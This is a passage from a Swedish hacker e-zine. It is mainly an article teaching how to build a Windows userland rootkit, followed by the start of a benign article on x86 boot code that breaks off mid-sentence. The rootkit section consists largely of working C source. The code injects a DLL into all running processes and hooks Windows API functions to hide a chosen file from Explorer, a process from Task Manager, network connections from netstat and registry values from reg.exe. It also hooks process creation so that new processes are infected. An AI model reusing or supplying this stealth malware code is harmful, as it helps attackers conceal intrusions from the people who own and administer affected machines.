+hook anropar SetWindowsHookEx med typen WH_MOUSE. Detta anger att alla program
+som läser av musen, laddar vår dll och exekverar MouseProc. MouseProc returnerar 
+med nästa hook. Första gången dll:en laddas anropas även en eventuell DllMain. 
+Här kan hookFunction anropas eftersom koden kommer köras i processen.
+
+LoadLibrary + CreateRemoteThread
+--------------------------------
+
+Med ett globalt hook begränsas det faktum att koden inte kommer exekveras i alla 
+processer. Det vore betydligt enklare om man hade en något diskretare teknik med 
+stöd för att injecta till valfri process. WIN-API tillhandahåller funktioner som 
+låter oss allokera minne, kopiera data samt starta trådar i andra processer. 
+Eftersom varje process laddar Kernel32.dll, har dess funktioner samma adress i 
+olika adressrymder. Med detta i åtanke kan man genomföra följande steg för att 
+injecta en dll, givet ett pid.
+
+1. Skapa en handle med OpenProccess vars rättigheter är WRITE, CREATE_THREAD 
+och OPERATION
+2. Allokera utrymme för dll-filens namn med VirtualAllocEx
+3. Skriv det absoluta filnamnet med WriteProcessMemory
+4. Använd CreateRemoteThread med start på GetProcAddress(GetModuleHandleA
+("Kernel32"), "LoadLibraryA"), adressen till filnamnet som argument
+5. Stäng handle med CloseHandle
+
+injectDll accepterar ett PID och utför ovan nämda steg.
+
+void injectDll(unsigned long ulPid)
+{
+   HANDLE hProcess;
+   void * vpMem;
+   char cpDll[] = DLL_PATH;
+   int iSize = sizeof(cpDll);
+      
+   hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD
+   | PROCESS_VM_OPERATION, FALSE, ulPid);
+
+   if( !hProcess )
+      dieWithError("OpenProcess failed");
+
+   vpMem = VirtualAllocEx(hProcess, NULL, iSize, MEM_COMMIT, PAGE_READWRITE);
+
+   if( !vpMem )
+      dieWithError("VirtualAllocEx failed");
+
+   BOOL bResult = WriteProcessMemory(hProcess, vpMem, cpDll, iSize, NULL);
+
+   if( !bResult )
+      dieWithError("WriteProcessMemory failed");
+
+   HANDLE hResult = CreateRemoteThread(hProcess, NULL, NULL
+   , (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32")
+   , "LoadLibraryA"), vpMem, NULL, NULL);
+
+   if( !hResult )
+      dieWithError("CreateRemoteThread failed");
+
+   CloseHandle( hProcess );
+}
+
+Om man vill injecta våran dll i alla körande processer behöver man enumera dessa 
+och anropa injectDll för varje PID. Med EnumProcesses sparas alla PID's i en 
+buffer. Sedan loopar man (i)genom denna och anropar injectDll för alla PID's.
+
+Endast det anropadande programmet ska köra detta, därför kollas filnamnet i 
+dllMain.
+
+char buf[MAX_PATH];
+GetModuleFileNameA(NULL, buf, MAX_PATH);
+
+if( strstr(buf, "injector") )
+{
+   unsigned long ulPids[256], ulBytesWritten;
+
+   EnumProcesses(ulPids, sizeof(unsigned long) * 256, &ulBytesWritten);
+
+   for( unsigned int i = 1; i <= ( ulBytesWritten / sizeof(unsigned long) );i++)
+      injectDll( ulPids[i] );
+}
+
+Med kunskap om hur kod körs i andra processer samt hur funktionsanrop kan
+ersättas, går vi vidare till en praktisk tillämpning.
+
+Hooks
+=====
+
+Filsystemet
+-----------
+
+För att lura de program som använder filsystemet, behöver man hooka
+FindFirstFile och FindNextFile. Det finns, vilket nästan alltid är fallet, både 
+ascii- och unicode-versioner av funktionerna (FindFirstFileA/W). Det primära 
+målet för att dölja filer är explorer.exe. Vid granskning av dess import's 
+hittas de tidigare nämda funktionerna.
+
+    KERNEL32.dll
+               1001098 Import Address Table
+               1068AE4 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      77E01810    24D GetSystemTime
+      77E449CA    1CE GetFileAttributesW
+      77E44EBF    119 FindClose
+      77E44F71    130 FindNextFileW
+      77E44E2A    124 FindFirstFileW
+     ....
+
+FindFirstFileW
+--------------
+
+HANDLE WINAPI FindFirstFile(
+  __in   LPCTSTR lpFileName,
+  __out  LPWIN32_FIND_DATA lpFindFileData
+);
+
+lpFileName är katalogen eller filnamnet där funktionen ska söka. 
+lpFindFileData innehåller den första träffen. Funktionen returnerar en HANDLE 
+som kan användas vid senare anrop till FindNextFile.
+
+typedef struct _WIN32_FIND_DATA {  DWORD dwFileAttributes;
+  FILETIME ftCreationTime;
+  FILETIME ftLastAccessTime;
+  FILETIME ftLastWriteTime;
+  DWORD nFileSizeHigh;
+  DWORD nFileSizeLow;
+  DWORD dwReserved0;
+  DWORD dwReserved1;
+  TCHAR cFileName[MAX_PATH];
+  TCHAR cAlternateFileName[14];
+} WIN32_FIND_DATA,  *PWIN32_FIND_DATA,  *LPWIN32_FIND_DATA;
+
+De intressanta medlemmarna här är cFileName och cAlternateFileName. cFileName 
+innehåller filnamnet utan katalog. cAlternateFileName innehåller alltid 
+filnamnet i formatet filnamn.ext.
+
+När FindFirstFileW ersätts måste man jämföra cFileName mot det förbestämda 
+filnamnet som ska döljas. Om filnamnet matchar behöver FindNextFileW anropas.
+
+HANDLE WINAPI HookedFindFirstFileW(
+  __in          LPCTSTR lpFileName,
+  __out         LPWIN32_FIND_DATA lpFindFileData
+)
+{
+   HANDLE l_hHandle;
+   BOOL l_bRet = 0;
+
+   l_hHandle = FindFirstFileW(lpFileName, lpFindFileData);
+
+   if( l_hHandle == INVALID_HANDLE_VALUE )
+      return INVALID_HANDLE_VALUE;
+
+   if( !strcmp((const char *)lpFindFileData->cFileName, "hidden.exe") )
+      l_bRet = HookedFindNextFileW(l_hHandle, lpFindFileData);
+
+   //Only FindNextFile may return ERROR_NO_MORE_FILES
+   if( l_bRet == ERROR_NO_MORE_FILES )
+      l_hHandle = INVALID_HANDLE_VALUE;
+
+   return l_hHandle;
+}
+
+När anropet till FindFirstFile har genomförts så används den handle som 
+returneras till att söka efter flera filer med FindNextFile.
+
+BOOL WINAPI FindNextFile(
+  __in          HANDLE hFindFile,
+  __out         LPWIN32_FIND_DATA lpFindFileData
+);
+
+hFindFile är alltså den handle som FindFirstFile returnerar. lpFindFileData
+innehåller nästa fil i sökningen. HookedFindNextFileW anropar FindNextFileW
+tills dess att funktionen inte returnerar den skyddade filen.
+
+BOOL WINAPI HookedFindNextFileW(
+  __in          HANDLE hFindFile,
+  __out         LPWIN32_FIND_DATA lpFindFileData
+)
+{   
+   BOOL l_bRet;
+
+   do
+   {
+      l_bRet = FindNextFileW(hFindFile, lpFindFileData);
+   }
+   while( l_bRet && l_bRet != ERROR_NO_MORE_FILES 
+   && !wcscmp(lpFindFileData->cFileName, L"hidden.exe") );
+
+   return l_bRet;
+}
+
+Processer
+---------
+
+När man vill dölja processer är taskmgr.exe det främsta målet. Vid undersökning 
+av dess imports hittas flera lågnivåfunktioner, bl.a. NtQuerySystemInformation.
+
+    ntdll.dll
+               100152C Import Address Table
+               1018418 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      77F40364    1E2 NtSetInformationFile
+      77F3FC84    157 NtOpenProcessToken
+      77F3FEB4    186 NtQueryInformationToken
+      77F42F1D    3B9 RtlInitializeCriticalSection
+      77F22E69    332 RtlEnterCriticalSection
+      77F22E29    3FA RtlLeaveCriticalSection
+      77F43068    308 RtlDeleteCriticalSection
+      77F3FCE4    15E NtOpenThread
+      77F3F354     CD NtClose
+      77F51205    4AA RtlTimeToElapsedTimeFields
+      77F3FCF4    15F NtOpenThreadToken
+      77F3FE94    183 NtQueryInformationProcess
+     ...
+     
+Detta betyder att hooks på högre nivå är meningslösa. Då Microsofts
+dokumentation av de lägre delarna av WIN-API är väldigt bristfällig och 
+funktionerna tenderar att förändra sig mellan varje Windowsversion så försvåras 
+arbetet.
+
+NTSTATUS WINAPI NtQuerySystemInformation(
+  __in          SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  __in_out      PVOID SystemInformation,
+  __in          ULONG SystemInformationLength,
+  __out_opt     PULONG ReturnLength
+);
+
+SystemInformationClass bestämmer vilken typ av information som hämtas. För att 
+erhålla information om aktiva processer används SystemProcessInformation.
+
+SystemInformation är en pekare till en buffert där en array av
+SYSTEM_PROCESS_INFORMATION sparas.
+
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    BYTE Reserved1[48];
+    PVOID Reserved2[3];
+    HANDLE UniqueProcessId;
+    PVOID Reserved3;
+    ULONG HandleCount;
+    BYTE Reserved4[4];
+    PVOID Reserved5[11];
+    SIZE_T PeakPagefileUsage;
+    SIZE_T PrivatePageCount;
+    LARGE_INTEGER Reserved6[6];
+} SYSTEM_PROCESS_INFORMATION;
+
+NextEntryOffset används för att loopa igenom samtliga arrayer med tillhörande 
+pid som returneras av funktionen. Exempel på loop:
+
+for( current = prev = (SYSTEM_PROCESS_INFORMATION *)SystemInformation; 
+current->NextEntryOffset; current = (SYSTEM_PROCESS_INFORMATION *)
+( (char *)current + current->NextEntryOffset) )
+
+UniqueProcessId innehåller det unika process-id som alla program associeras med. 
+För att utvinna namnet på processen används funktionen getNameFromPid.
+
+bool getNameFromPid(unsigned long ulPid, char * cpBuf, int iLen)
+{
+      HANDLE hPro = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
+     , FALSE, ulPid);
+
+      if( !hPro )
+         return false;
+
+      HMODULE hMod;
+      unsigned long ulBytes;
+      EnumProcessModules(hPro, &hMod, sizeof(hMod), &ulBytes);
+
+      memset(cpBuf, '\0', iLen);
+      GetModuleBaseNameA(hPro, hMod, cpBuf, iLen);
+      CloseHandle( hPro );
+
+      return true;
+}
+
+Funktionen enumererar alla aktiva processer och skriver det associerade namnet 
+till cpBuf.
+
+Det är endast dessa två medlemmar man behöver använda för att manipulera 
+resultatet. Tyvärr så har SYSTEM_PROCESS_INFORMATION ändrats ett flertal gånger 
+under de senaste versionerna av Windows, vilket gör detta anpassat till endast 
+Windows Xp/Vista. Här är den färdiga funktionen som döljer processen med namnet 
+som definierades  till PROCESS. För att endast dölja ett specifikt pid 
+modifieras if-satsen:
+
+if( strstr(cProcess, PROCESS))
+till
+if( int(current->UniqueProcessId) == PID )
+
+NTSTATUS WINAPI HookedNtQuerySystemInformation(
+  /*__in*/          SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  /*__in_out*/      PVOID SystemInformation,
+  /*__in*/          ULONG SystemInformationLength,
+  /*__out_opt*/     PULONG ReturnLength
+)
+{
+   NTSTATUS ret = ((orgNtQuerySystemInformation)
+   hookNtQuerySystemInformation.m_vpOriginal)(SystemInformationClass
+   , SystemInformation, SystemInformationLength, ReturnLength);
+
+   if(ret != STATUS_SUCCESS || SystemInformationClass != 
+   SystemProcessInformation)
+      return ret;
+
+   char cProcess[MAX_PATH];
+   SYSTEM_PROCESS_INFORMATION * current, * prev;
+
+   for( current = prev = (SYSTEM_PROCESS_INFORMATION *)SystemInformation; 
+   current->NextEntryOffset; current = (SYSTEM_PROCESS_INFORMATION *)( 
+   (char *)current + current->NextEntryOffset) )
+   {
+      getNameFromPid((int)(current->UniqueProcessId), cProcess, MAX_PATH);
+
+      if( strstr(cProcess, PROCESS)) // int(current->UniqueProcessId) == 2100
+      {
+         if( !current->NextEntryOffset )
+            prev->NextEntryOffset = 0;
+
+         else
+            prev->NextEntryOffset += current->NextEntryOffset;
+      }
+      else
+         prev = current;
+   }
+
+
+   return ret;
+}
+
+Anslutningar
+------------
+
+För att dölja anslutningar är netstat.exe det främsta målet. 
+Tredjepartsapplikationer, som fport, använder oftast liknande funktioner.
+
+netstat skiljer sig avsevärt mellan Xp och Vista. Under Xp används funktionen 
+AllocateAndGetTcpExTableFromStack för att hämta data för aktuella anslutningar.
+I Vista existerar inte ens denna funktion. För exempel på hooks till
+AllocateAndGetTcpExTableFromStack, hänvisar jag till NtIllusion rootkit.
+
+netstat's imports avslöjar att den använder flera funktioner exporterade av
+IPHLPAPI.DLL.
+
+    IPHLPAPI.DLL
+               100101C Import Address Table
+               10051B8 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      6C62CA6B     AA InternalGetTcpTableWithOwnerModule
+      6C62CA93     A5 InternalGetTcp6Table2
+      6C62CB4F     B0 InternalGetUdpTableWithOwnerModule
+      6C62CADD     A6 InternalGetTcp6TableWithOwnerModule
+      6C62CA21     A9 InternalGetTcpTable2
+      6C629EFE     71 GetTcpStatisticsEx
+      6C62D059     46 GetIcmpStatisticsEx
+      6C62A417     5C GetIpStatisticsEx
+      6C629B4B     77 GetUdpStatisticsEx
+      6C62CB9C     AD InternalGetUdp6TableWithOwnerModule
+
+Då Internal-funktioner saknar dokumentation från Microsoft så försvårar detta
+något. Efter att netstat har anropat InternalGetTcp6Table2 kommer programmet
+använda någon funktion för att skriva ut resultatet visuellt. En snabb kik i
+olly ger att FormatMessageA och CharToOemBuffA anropas för att formatera 
+resultatet till skärmen. Vi hittar A/W-versioner bland import's.
+     
+    USER32.dll
+               10010CC Import Address Table
+               1005268 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      77D66CAD     34 CharToOemBuffA
+      77D84CF5     35 CharToOemBuffW
+     
+Om filen anayseras i en debugger syns det även att CharToOemBuffA anropas efter 
+InternalGetTcp6Table2, för varje rad output.
+
+00733DC7  /$ 8BFF           MOV EDI,EDI
+00733DC9  |. 55             PUSH EBP
+00733DCA  |. 8BEC           MOV EBP,ESP
+00733DCC  |. 51             PUSH ECX
+00733DCD  |. 51             PUSH ECX
+00733DCE  |. 57             PUSH EDI
+00733DCF  |. 8D45 10        LEA EAX,DWORD PTR SS:[EBP+10]
+00733DD2  |. 8945 F8        MOV DWORD PTR SS:[EBP-8],EAX
+00733DD5  |. 8D45 F8        LEA EAX,DWORD PTR SS:[EBP-8]
+00733DD8  |. 50             PUSH EAX
+00733DD9  |. 6A 00          PUSH 0
+00733DDB  |. 8D45 FC        LEA EAX,DWORD PTR SS:[EBP-4]
+00733DDE  |. 50             PUSH EAX
+00733DDF  |. 6A 00          PUSH 0 
+00733DE1  |. FF75 0C        PUSH DWORD PTR SS:[EBP+C]
+00733DE4  |. 6A 00          PUSH 0
+00733DE6  |. 68 00090000    PUSH 900
+00733DEB  |. FF15 B0107300  CALL DWORD PTR DS:[<&KERNEL32.FormatMess>
+00733DF1  |. 8BF8           MOV EDI,EAX
+00733DF3  |. 85FF           TEST EDI,EDI
+00733DF5  |. 74 65          JE SHORT NETSTAT.00733E5C
+00733DF7  |. 837D 08 02     CMP DWORD PTR SS:[EBP+8],2
+00733DFB  |. 56             PUSH ESI
+00733DFC  |. 8B35 54117300  MOV ESI,DWORD PTR DS:[<&msvcrt._iob>]
+00733E02  |. 75 05          JNZ SHORT NETSTAT.00733E09
+00733E04  |. 83C6 40        ADD ESI,40
+00733E07  |. EB 03          JMP SHORT NETSTAT.00733E0C
+00733E09  |> 83C6 20        ADD ESI,20
+00733E0C  |> 68 00800000    PUSH 8000
+00733E11  |. 56             PUSH ESI
+00733E12  |. FF15 58117300  CALL DWORD PTR DS:[<&msvcrt._fileno>]
+00733E18  |. 59             POP ECX
+00733E19  |. 50             PUSH EAX
+00733E1A  |. FF15 5C117300  CALL DWORD PTR DS:[<&msvcrt._setmode>]
+00733E20  |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]
+00733E23  |. 59             POP ECX
+00733E24  |. 59             POP ECX
+00733E25  |. 8D48 01        LEA ECX,DWORD PTR DS:[EAX+1]
+00733E28  |> 8A10           /MOV DL,BYTE PTR DS:[EAX]
+00733E2A  |. 40             |INC EAX
+00733E2B  |. 84D2           |TEST DL,DL
+00733E2D  |.^75 F9          \JNZ SHORT NETSTAT.00733E28
+00733E2F  |. 2BC1           SUB EAX,ECX
+00733E31  |. 50             PUSH EAX
+00733E32  |. FF75 FC        PUSH DWORD PTR SS:[EBP-4]
+00733E35  |. FF75 FC        PUSH DWORD PTR SS:[EBP-4]
+00733E38  |. FF15 CC107300  CALL DWORD PTR DS:[<&USER32.CharToOemBuf>
+00733E3E  |. FF75 FC        PUSH DWORD PTR SS:[EBP-4]
+00733E41  |. 68 D0117300    PUSH NETSTAT.007311D0
+00733E46  |. 56             PUSH ESI
+00733E47  |. FF15 60117300  CALL DWORD PTR DS:[<&msvcrt.fprintf>]
+00733E4D  |. 83C4 0C        ADD ESP,0C
+00733E50  |. FF75 FC        PUSH DWORD PTR SS:[EBP-4]
+00733E53  |. FF15 B4107300  CALL DWORD PTR DS:[<&KERNEL32.LocalFree>>
+00733E59  |. 8BC7           MOV EAX,EDI
+00733E5B  |. 5E             POP ESI
+00733E5C  |> 5F             POP EDI
+00733E5D  |. C9             LEAVE
+00733E5E  \. C3             RETN
+
+Detta betyder att man kan hooka CharToOemBuffA för uppnå önskad effekt.
+
+BOOL CharToOemBuffA( 
+    LPCSTR lpszSrc,
+    LPSTR lpszDst,
+    DWORD cchDstLength
+);
+
+lpszSrc är pekare till en nullterminerad sträng av indata.
+lpszDst pekar på en buffer där resultatet skrivs ut.
+cchDstLength innehåller antalet tecken som ska översättas från lpszSrc.
+
+
+Här kommer ett exempel på hook av CharToOemBuffA. Hela källkod- och headerfilen 
+bifogas.
+
+/* CharToOemBuff.c */
+
+#include "StdAfx.h"
+#include "CharToOemBuff.h"
+#include "../config.h"
+
+SHook hookCharToOemBuffA = {"USER32.dll", "CharToOemBuffA", (unsigned long)
+HookedCharToOemBuffA, NULL};
+
+BOOL WINAPI HookedCharToOemBuffA( 
+    LPCSTR lpszSrc,
+    LPSTR lpszDst,
+    DWORD cchDstLength
+)
+{
+   if( strstr(lpszSrc, IP) )
+      return ((orgCharToOemBuffA)hookCharToOemBuffA.vpOriginal)("", lpszDst
+, cchDstLength);
+
+   return ((orgCharToOemBuffA)hookCharToOemBuffA.vpOriginal)(lpszSrc, lpszDst
+, cchDstLength);
+}
+
+
+/* CharToOemBuff.h */
+
+#pragma once
+#include "../SHook.h"
+
+typedef BOOL (WINAPI*orgCharToOemBuffA)(LPCSTR, LPSTR, DWORD);
+
+BOOL WINAPI HookedCharToOemBuffA( 
+    LPCSTR lpszSrc,
+    LPSTR lpszDst,
+    DWORD cchDstLength
+);
+
+extern SHook hookCharToOemBuffA;
+
+     
+Registret
+---------
+
+För att undersöka registret under Windows används främst regedt32.exe (GUI) och 
+reg.exe (konsol). Även regedit.exe finns. Dump av regedt32.exe imports visar 
+inget intressant förutom:
+
+    SHELL32.dll
+               100104C Import Address Table
+               1001B8C Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      7672A3E8    114 ShellExecuteA
+     
+Troligtvis så anropar regedt32.exe reg.exe för att hämta värden. Jävla fulhack.
+reg.exe intressanta imports:
+
+    ADVAPI32.dll
+               1001000 Import Address Table
+               100D694 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+           
+      77CD64CC    22A RegCloseKey
+      77CA669D    22E RegConnectRegistryW
+      77CD632E    268 RegQueryValueExW
+      77CC7B8D    25E RegOpenKeyW
+      77CC802D    278 RegSetValueExW
+      77CC04A2    233 RegCreateKeyExW
+      77CD5ECD    25B RegOpenKeyExW
+      77CBEB10    249 RegEnumKeyExW
+      77CBEFCA    24C RegEnumValueW
+      77CBEE0A    262 RegQueryInfoKeyW
+      77CB5E95     1E AdjustTokenPrivileges
+      77CB5ECC    191 LookupPrivilegeValueW
+      77CBF357    1F1 OpenProcessToken
+      77D12119    272 RegSaveKeyW
+      77D12421    271 RegSaveKeyExW
+      77D11E61    26E RegRestoreKeyW
+      77C99285    254 RegLoadKeyW
+      77CD7C4A    27B RegUnLoadKeyW
+      77CD66F7    250 RegGetValueW
+      77CAB02D    23E RegDeleteKeyW
+      77CBB380    242 RegDeleteValueW
+      77CBB19C    24A RegEnumKeyW
+      77CA8229    236 RegCreateKeyW
+      77CD7E74    24D RegFlushKey
+      77CD93F5    279 RegSetValueW
+      77CB3C99    277 RegSetValueExA
+
+    ntdll.dll
+               10011AC Import Address Table
+               100D840 Import Name Table
+              FFFFFFFF time date stamp
+              FFFFFFFF Index of first forwarder reference
+
+      77F40384    1E4 NtSetInformationKey
+      77F3FEF4    18D NtQueryKey
+     
+Wohoo, nu flödar registerfunktionerna. NT-funktionerna saknar dokumentation, så 
+ett första försök med Reg**** blir det naturliga valet för den late. De 
+funktioner som används för att hämta information är främst RegEnumValueW. 
+Prototyp:
+
+LONG WINAPI RegEnumValueW(
+  __in          HKEY hKey,
+  __in          DWORD dwIndex,
+  __out         LPTSTR lpValueName,
+  __in_out      LPDWORD lpcchValueName,
+  LPDWORD lpReserved,
+  __out         LPDWORD lpType,
+  __out         LPBYTE lpData,
+  __in_out      LPDWORD lpcbData
+);
+
+Funktionen enumerar alla poster i nyckeln key. Beroende på dwIndex returnerar 
+funktionen en viss post. lpValueName är namnet på nyckeln. Hooket nedan anropar 
+först orginalfunktionen och konverterar resultatet (lpValueName) till ASCII. Om 
+REG_KEY återfinns i resultatet så inkrementeras dwIndex och funktionen 
+returnerar med RegEnumValueW på nästa nyckel. Hooket är knappast fulländat då 
+det missar vissa nycklar, något som läsaren får fundera på.
+
+LONG WINAPI HookedRegEnumValueW(
+  __in          HKEY hKey,
+  __in          DWORD dwIndex,
+  __out         LPTSTR lpValueName,
+  /*__in_out*/      LPDWORD lpcchValueName,
+  LPDWORD lpReserved,
+  __out         LPDWORD lpType,
+  __out         LPBYTE lpData,
+  /*__in_out*/      LPDWORD lpcbData
+)
+{
+   LONG ret = ((orgRegEnumValueW)hookRegEnumValueW.m_vpOriginal)(hKey, dwIndex
+   , lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData);
+
+   WideCharToMultiByte(CP_ACP, NULL, lpValueName, -1, l_cBuf, MAX_PATH, NULL
+, NULL);
+
+   if( strstr(l_cBuf, REG_KEY) )
+      return ((orgRegEnumValueW)hookRegEnumValueW.m_vpOriginal)(hKey
+      , ++dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData
+      , lpcbData);
+
+   return ret;
+}
+
+CreateProcess
+-------------
+
+När rootkitet körs så påverkas alla aktiva processer och koden exekveras inom 
+dessa. Detta betyder att varje gång en ny process startas med CreateProcess så 
+kommer den inte vara påverkad av vårt rootkit. För att kringgå problemet behöver 
+man hooka CreateProcess. Den hookade funktionen kommer först anropa originalet 
+varpå den pausar exekveringen av den startade processen. Detta för att ersätta 
+alla  funktionsanrop innan tråden återställs med ResumeThread. Processens PID 
+och  tillhörande HANDLEs finns i lpProcessInformation, det sista argumentet till 
+CreateProcess.
+
+SHook hookCreateProcessW("KERNEL32.dll", "CreateProcessW"
+, (unsigned long)HookedCreateProcessW, NULL);
+
+BOOL WINAPI HookedCreateProcessW(
+  __in_opt     LPCTSTR lpApplicationName,
+  __inout_opt  LPTSTR lpCommandLine,
+  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  __in         BOOL bInheritHandles,
+  __in         DWORD dwCreationFlags,
+  __in_opt     LPVOID lpEnvironment,
+  __in_opt     LPCTSTR lpCurrentDirectory,
+  __in         LPSTARTUPINFO lpStartupInfo,
+  __out        LPPROCESS_INFORMATION lpProcessInformation
+)
+{
+   BOOL ret = ((orgCreateProcessW)hookCreateProcessW.m_vpOriginal)(
+   lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes
+      , bInheritHandles, CREATE_SUSPENDED, lpEnvironment, lpCurrentDirectory
+      , lpStartupInfo, lpProcessInformation);
+
+   unsigned long ulPid = 
+   ((PROCESS_INFORMATION *)lpProcessInformation)->dwProcessId;
+   HANDLE hThread = ((PROCESS_INFORMATION *)lpProcessInformation)->hThread;
+
+   injectDll( ulPid );
+   Sleep(2000);
+   ResumeThread(hThread);
+
+   return ret;
+}
+
+Slutord
+=======
+
+Förhoppningsvis har jag gett dig en grundlig inblick i hur rootkits fungerar. 
+Vid vidare intresse är boken "Subverting The Windows Kernel" ovärderlig.
+
+Källor
+======
+
+Rootkits: Subverting the Windows Kernel (Addison-Wesley Software Security 
+Series)
+
+http://msdn.microsoft.com/en-us/library/ms809762.aspx
+http://www.codeproject.com/KB/threads/winspy.aspx
+
+================================================================================
+0x02 bootbar kod för x86 - Del 1                                        swestres
+================================================================================
+
+Inledning
+---------
+Denna artikel kommer att handla om vad den heter. Bootbar kod i det här 
+sammanhanget är kod som körs då datorn startar upp, efter det att det laddats 
+till minnet av BIOS. x86 är intels 32-bitars arkitektur (a.k.a. IA-32). Den
+kommer att lägga grunden för kommande artiklar som kommer att gå lite mer på
+djupet. Det är rekommenderat att kunna x86/IA-32 assembler sen tidigare.
+
+Att skriva program som ska köras av datorn själv, utan de abstraktionslager
+som ett operativsystem erbjuder i form av systemanrop och kodbibliotek, är 
+väldigt annorlunda mot vad det är att skriva vanliga applikationsprogram för
+t.ex. Windows. Skriver du ett filter för POSIX-system kanske du vill att det
+ska skriva ut text till skärmen. Då använder du printf vars implementering 
+finns i libc. Men vad skulle du göra om libc inte finns att tillgå?
+
+Vi kommer att leka med en del saker som kan resultera i att du genom oaktsamhet
+eller idioti förstör/skriver över data som kan vara viktig för dig eller din 
+dator. Artikelförfattaren tar inget ansvar i händelse av förlorad data.
+
+Bootprocessen
+-------------
+När du trycker på Av/På-knappen till din dator händer det något magiskt. Då den 
+strida strömmen av elektroner återigen börjar flöda genom CPUns kretsar sätts 
+instruktionspekaren till 0xFFFF0 som råkar vara en adress i din dators BIOS 
+(Basic Input/Output System). Initieringskod börjar köras, själv-tester, 
+bootstrapping av andra enheter än CPUn etc. När BIOSet har gjort sitt är det 
+dags att ladda den kod som ska köras till minnet. Vårt BIOS börjar frenetiskt
+att leta efter körbar kod. Den kollar USB-diskar, disketter (om någon använder
+det fortfarande), CR-ROM skivor och hårddiskar. När den hittar någon form
+av läsbar lagringsmedia där de sista två byten i slutet av den
+första sektorn på disken (denna sektor kallas för bootsektorn) är 0x55 0xAA så
+laddar den sektorn till minnesadress 0x7C00 och påbörjar körning. 
+
+Fram tills nu har vi inte kunnat påverka så mycket. Den första maskinkod vår
+CPU kör är BIOS, och den sitter oftast i ett flashminne (IC-krets style) eller
+i ett äldre EEPROM. Klart vi kan ändra denna med en programmerare, men det är 
+ett djup jag aldrig simmat på, ett berg jag aldrig klättrat, en väg jag aldrig 
+gått. Istället ska vi fokusera på att skriva kod som bootas av BIOS.
+
+x86 - arbetslägen, minnesadressering och I/O
+--------------------------------------------
+IA-32 är en kul arkitektur. Intel har satsat hårt på bakåtkompabilitet, och
+istället för att göra sig av med gamla föråldrade saker låter man de vara kvar
+för att inte göra gammal, plattformsberoende (visa mig något som är oberoende
+av plattform...) mjukvara ska bli värdelös. På grund av detta kan just 
+bootprocessen bli väldigt invecklad. Saken görs inte lättare av att andra
+komponenter vid sidan av CPUn följer samma mantra när det gäller 
+bakåtkompabilitet. Klart det finns fördelar, samma gränssnitt idag som för 20 år
+sedan gör att man slipper lära sig nya gränssnitt hela tiden och anpassa 
+mjukvaran därefter. Gamla gränssnitt ligger kvar vid sidan av de nya, dåligt
+dokumenterade, proprietära gränssnitten.
+
+Till att börja med har IA-32 två typer av arbetslägen: 16-bitars och 32-bitars.
+När processorn startat och BIOS gjort sitt arbetar den i 16-bitars läge.
+Detta innebär att adressbussen och registerna är 16-bitar breda, du kan
+adressera 64 kilobyte RAM (de där gigabyten du sitter på spelar inte så stor
+roll helt plötsligt) och CPUns general purpose register kan hålla tal
+mellan 0 och 65535 eller -32768 till 32767. 
+
+Minnessadresseringen i detta läge är ganska kul den med. Jag nämnde innan att 
+man kan adressera 64-kilobyte RAM. Detta är inte riktigt sant. Du kan adressera
+64 kB *inom samma segment*! Det är nämligen så här att adresser i detta läge 
+(som för övrigt går under namnet 16-bit real mode på utrikiska) delas
+upp i två delar, segment och offset. För att omvandla en fysisk adress i RAM,
+t.ex. 0xA0104 till segment:offset adress tar vi och skiftar adressen fyra steg
+åt höger (dividerar med 16) och adderar vår offset. Således är A0104 och
+A010:0004 samma adress. Skälet till att man krånglar till det såhär är så att
+man ska kunna adressera upp till 1 MB RAM. Vi får 20-bitars adresser.
+
+För att underlätta adressering finns det flertalet segmentregister som håller 
+vad de kallas, segmentadresser. Om vi delar upp vårt program så att vi har
+data vid 0x10000, kod vid 0x20000 och stacken vid 0x3FFFC (stacken växer
+neråt, remember?) så sätter vi datasegmentsregistret ds till 0x1000,
+kodsegmentsregistret cs till 0x2000 och stacksegmentsregistret ss till
+0x3000 och stackpekaren sp till 0xFFFC. Genom att dela upp minnet på detta
+sätt och inte ha segment som överlappar varandra (vilket är fullt möjligt)
+slipper vi missöden som att stacken skulle skriva över kod eller data när
+den fylls. Om sp är 0x0000 och vi pushar något på stacken wrappar den runt och
+blir 0xFFFC, men ss är fortfarande 0x3000, så vi skriver "bara" över tidigare
+stackelement. 
+
+På tal om segment så är vissa register bundna till vissa segment. Instruktions-
+pekaren är bunden till cs, kodsegmentet. di är bunden till es, si är bunden till
+ds. De två sista för lods/stos instruktioner. Stackpekaren sp är bunden till ss,
+stacksegmentet.
+
+x86 har en separat minnesrymd skild från den vanliga adressbussen för I/O, in-
+och utmatning av data. Den vanliga minnesrymden används också för I/O, men
+det finns alltså en separat minnesrymd dedikerad för I/O. Adresser i denna
+minnesrymd brukar kallas för I/O-portar. Ska vi vara petnoga adresserar man 
+I/O-portar, adresserna är fortfarande adresser. Man använder inte instruktionen
+mov för att skriva till/läsa från dessa adresser, istället använder man
+instruktionerna in och out. 
+
+I 16-bitars real mode adresserar man fysiska adresser. Det gör man inte i 
+Windows eller linux (eller något modernt OS värt namnet), där får varje
+process en separat, virtuell minnesrymd. Behöver du komma åt minnesrymden 
+hos en annan process i Windows får du låta kärnan hantera det via API-anropet
+ReadProcessMemory, och i Linux via systemanropet ptrace. Men här går det 
